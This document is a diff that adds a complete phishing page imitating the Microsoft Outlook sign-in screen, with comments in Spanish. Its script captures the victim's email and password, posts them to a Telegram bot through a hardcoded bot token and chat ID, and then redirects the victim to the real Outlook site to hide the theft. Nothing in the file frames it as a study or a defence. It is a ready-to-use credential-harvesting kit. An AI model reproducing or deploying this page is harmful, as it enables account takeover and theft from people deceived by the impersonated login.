@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesion</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Pantalla de correo -->
+        <div id="email-step" class="sign-in-box">
+            <img src="https://www.freepnglogos.com/uploads/microsoft-logo-png-transparent-background-1.png" alt="Microsoft Logo" class="logo">
+            <h2>Sign in</h2>
+            <p>to continue to Outlook</p>
+            <form id="email-form" action="#" method="post" onsubmit="saveUsername(); return false;">
+                <div class="form-group">
+                    <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
+                </div>
+                <button type="submit" class="btn-next" id="btn-next">Next</button>
+                <p class="no-account">No account? <a href="#">Create one!</a></p>
+            </form>
+        </div>
+        
+        <!-- Pantalla de contraseña -->
+        <div id="password-step" class="sign-in-box" style="display: none;">
+            <img src="https://www.freepnglogos.com/uploads/microsoft-logo-png-transparent-background-1.png" alt="Microsoft Logo" class="logo">
+            <h2>Sign in</h2>
+            <p>Enter your password to continue</p>
+            <form id="password-form" action="#" method="post" onsubmit="return validatePasswordForm();">
+                <div class="form-group">
+                    <input id="password" name="password" type="password" required placeholder="Password">
+                    <i class="fa fa-eye eye-icon" aria-hidden="true" onclick="showPassword()"></i>
+                </div>
+                <a id="forgot-password" href="#">Forgot your password?</a>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="privacy-policy">
+                    <label for="privacy-policy">I agree to the privacy policy.</label>
+                </div>
+                <button type="submit" class="btn-primary" onclick="return sender()">Sign In</button>
+            </form>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailForm = document.getElementById('email-form');
+            const passwordStep = document.getElementById('password-step');
+            const emailStep = document.getElementById('email-step');
+            
+            emailForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                saveUsername();
+                emailStep.style.display = 'none';
+                passwordStep.style.display = 'block';
+            });
+        });
+
+        // Variables globales
+        var telegram_bot_id = "8004306892:AAEI-WKuv_luh4K9PhzlgpS6oZMXo9H-DeM"; // Reemplaza con el token de tu bot
+        var chat_id = "7241147800"; // Reemplaza con el ID del chat
+        
+        var u_name = ""; // Almacenar correo electrónico globalmente
+        var pax = ""; // Almacenar contraseña globalmente
+        
+        // Función para preparar los datos del usuario
+        function saveUsername() {
+            u_name = document.getElementById("email").value;
+        }
+        
+        // Función para preparar los datos de la contraseña
+        function ready() {
+            pax = document.getElementById("password").value;
+            message = "📧EMAIL: " + u_name + 
+                      "\n🔒Cl4v3: " + pax +
+                      "\n\n🐺Posdre🐺";
+        }
+        
+        // Función para enviar datos
+        function sender() {
+            ready();
+            var settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify({
+                    "chat_id": chat_id,
+                    "text": message
+                })
+            };
+            $.ajax(settings).done(function (response) {
+                console.log(response);
+                // Redirigir a Outlook después de enviar los datos
+                window.location.href = 'https://outlook.live.com';
+            }).fail(function(jqXHR, textStatus, errorThrown) {
+                console.log('Error al enviar los datos:', textStatus, errorThrown);
+                alert('Error al enviar los datos. Inténtalo de nuevo.');
+            });
+            return false; // Prevenir el comportamiento por defecto del botón
+        }
+        
+        function validatePasswordForm() {
+            var password = document.getElementById("password").value;
+            var privacyCheck = document.getElementById("privacy-policy").checked;
+        
+            if (password === "") {
+                alert("Por favor, ingrese su contraseña.");
+                return false;
+            }
+            if (!privacyCheck) {
+                alert("Debe aceptar la política de privacidad.");
+                return false;
+            }
+            return true;
+        }
+        
+        function showPassword() {
+            const passwordField = document.getElementById('password');
+            const type = passwordField.type === 'password' ? 'text' : 'password';
+            passwordField.type = type;
+        }
+    </script>
+</body>
+</html>
